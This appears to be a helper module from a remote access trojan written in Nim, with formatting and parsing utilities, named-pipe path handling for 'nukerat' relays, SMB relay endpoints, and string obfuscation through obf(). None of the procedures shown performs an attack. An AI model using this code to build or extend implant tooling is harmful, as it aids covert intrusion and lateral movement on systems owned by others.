import std/json
import std/parseutils
{.push warning[Deprecated]: off.}
import std/md5
{.pop.}
import std/strutils
import std/tables
import ../global

proc digestHex*(s: string): string =
  # Returns the MD5 hex digest of the string
  getMD5(s)

proc fmtU64*(n: uint64; buf: var openArray[char]): int =
  # Writes an unsigned integer as decimal digits into the buffer
  if n == 0:
    if buf.len == 0: return -1
    buf[0] = '0'
    return 1
  var tmp: array[24, char]
  var d = 0
  var v = n
  while v > 0:
    tmp[d] = char(ord('0') + int(v mod 10))
    v = v div 10
    inc d
  if d > buf.len: return -1
  for i in 0 ..< d: buf[i] = tmp[d - 1 - i]
  d

proc fmtSize*(sz: uint64; buf: var openArray[char]): int =
  # Writes a byte size with a unit suffix into the buffer
  const kb = 1024'u64
  const mb = kb * 1024
  const gb = mb * 1024
  if sz < kb:
    let n = fmtU64(sz, buf)
    if n < 0: return -1
    if n + 2 > buf.len: return -1
    buf[n] = ' '; buf[n + 1] = 'B'
    return n + 2
  let divv = if sz < mb: kb elif sz < gb: mb else: gb
  let whole = sz div divv
  let frac = (sz mod divv) * 10 div divv
  var pos = fmtU64(whole, buf)
  if pos < 0: return -1
  if pos + 4 > buf.len: return -1
  buf[pos] = '.'
  buf[pos + 1] = char(ord('0') + int(frac))
  buf[pos + 2] = if sz < mb: 'K' elif sz < gb: 'M' else: 'G'
  buf[pos + 3] = 'B'
  pos + 4

proc appendStr*(buf: var openArray[char]; pos: var int; s: string): bool =
  # Appends a string to the buffer at the current position
  if pos + s.len > buf.len: return false
  if s.len > 0: copyMem(addr buf[pos], unsafeAddr s[0], s.len)
  pos += s.len
  true

proc appendByte*(buf: var openArray[char]; pos: var int; c: char): bool =
  # Appends one character to the buffer at the current position
  if pos >= buf.len: return false
  buf[pos] = c; inc pos; true

proc appendCol*(buf: var openArray[char]; pos: var int; s: string; width: int; right: bool): bool =
  # Writes a fixed width column into the buffer
  if pos + width > buf.len: return false
  if s.len >= width:
    let start = if right: s.len - width else: 0
    copyMem(addr buf[pos], unsafeAddr s[start], width)
  elif right:
    for i in 0 ..< width - s.len: buf[pos + i] = ' '
    if s.len > 0: copyMem(addr buf[pos + width - s.len], unsafeAddr s[0], s.len)
  else:
    if s.len > 0: copyMem(addr buf[pos], unsafeAddr s[0], s.len)
    for i in s.len ..< width: buf[pos + i] = ' '
  pos += width; true

proc tagFromSource*(src: string): string =
  # Builds a five character tag from hex digits or a digest
  var clean = ""
  for c in src:
    if c in {'0'..'9', 'a'..'f', 'A'..'F'}:
      clean.add c
  if clean.len < 5:
    clean = digestHex(src)
  if clean.len < 5:
    result = obf("00000")
  else:
    result = clean[0 .. 4]

proc parsePortDigits*(s: string): int =
  # Reads leading digits and returns a port, or zero when invalid
  result = 0
  var got = false
  for c in s:
    if c < '0' or c > '9':
      break
    got = true
    result = result * 10 + ord(c) - ord('0')
  if not got or result <= 0 or result > 65535:
    return 0

proc clipText*(s: string; n = 512): string =
  # Returns the string clipped to the given length
  if s.len <= n: s else: s[0 ..< n] & obf("...")

proc jsonKeysList*(pkt: JsonNode): string =
  # Returns the object keys as a bracketed list
  var keys: seq[string] = @[]
  if pkt.kind == JObject:
    for k, _ in pkt.pairs:
      keys.add k
  obf("[") & keys.join(",") & obf("]")

proc parsePortInt*(raw: string): int =
  # Parses a port integer, or returns zero when invalid
  var port = 0
  if parseInt(raw.strip(), port) > 0 and port > 0 and port <= 65535:
    port
  else:
    0

proc pipeBaseName(raw: string): string =
  # Strips a pipe prefix and returns the base name
  let v = raw.strip()
  if v.len == 0:
    return ""
  let dotPrefix = obf(r"\\.\pipe\")
  let plainPrefix = obf(r"\\pipe\")
  if v.len >= dotPrefix.len and v[0 ..< dotPrefix.len].toLowerAscii() == dotPrefix.toLowerAscii():
    return v[dotPrefix.len .. ^1]
  if v.len >= plainPrefix.len and v[0 ..< plainPrefix.len].toLowerAscii() == plainPrefix.toLowerAscii():
    return v[plainPrefix.len .. ^1]
  v

proc pipePathValid*(raw: string): bool =
  # Checks that the raw pipe path has a base name
  pipeBaseName(raw).len > 0

proc pipeNormalize*(raw: string): string =
  # Returns the pipe path with a normalized prefix
  let name = pipeBaseName(raw)
  if name.len == 0:
    return ""
  obf(r"\\pipe\") & name

proc pipeLocalFromRaw*(raw: string): string =
  # Builds the local temp path for the pipe name
  let name = pipeBaseName(raw)
  if name.len == 0:
    return ""
  obf("/tmp/nukerat-pipe/") & name

proc pipeRemoteFromRaw*(raw: string; destinyHost: string): string =
  # Builds the remote pipe path from the host and the pipe name
  let name = pipeBaseName(raw)
  if name.len == 0 or destinyHost.len == 0:
    return ""
  destinyHost & obf("|") & name

proc pipePaths*(host, pipePath: string): (string, string) =
  # Returns the local and remote pipe paths for the host
  result[0] = pipeLocalFromRaw(pipePath)
  result[1] = pipeRemoteFromRaw(pipePath, host)

proc targetSchemeParts*(raw: string): (string, string) =
  # Splits a target into the scheme and the remainder
  let v = raw.strip()
  let schemeSep = obf("://")
  let idx = v.find(schemeSep)
  if idx > 0:
    return (v[0 ..< idx].toLowerAscii(), v[idx + schemeSep.len .. ^1].strip())
  (obf("implant"), v)

proc parseHostPort*(raw: string; defaultPort: int): (string, int) =
  # Splits host and port, using the default port when none is present
  var value = raw.strip()
  if value.len == 0:
    return ("", 0)
  var host = value
  var port = defaultPort
  let colon = value.rfind(':')
  if colon > 0:
    let maybePort = value[colon + 1 .. ^1]
    var parsed = 0
    if parseInt(maybePort, parsed) > 0 and parsed > 0 and parsed <= 65535:
      host = value[0 ..< colon]
      port = parsed
  (host.strip(), port)

proc parseRelayEndpoint*(raw: string; transport: string): JsonNode =
  # Builds a relay endpoint from the raw address and the transport
  let defaultPort = if transport == obf("smb"): 445 else: 0
  let (host, port) = parseHostPort(raw, defaultPort)
  %*{(obf("scheme")): transport, (obf("host")): %host, (obf("port")): %port}

proc argsColonTable*(raw: string): Table[string, string] =
  # Parses whitespace separated key value tokens into a table
  var tbl = initTable[string, string]()
  if raw.len == 0:
    return tbl
  for token in raw.splitWhitespace():
    let idx = token.find(':')
    if idx <= 0:
      continue
    tbl[token[0 ..< idx].toLowerAscii()] = token[idx + 1 .. ^1]
  tbl
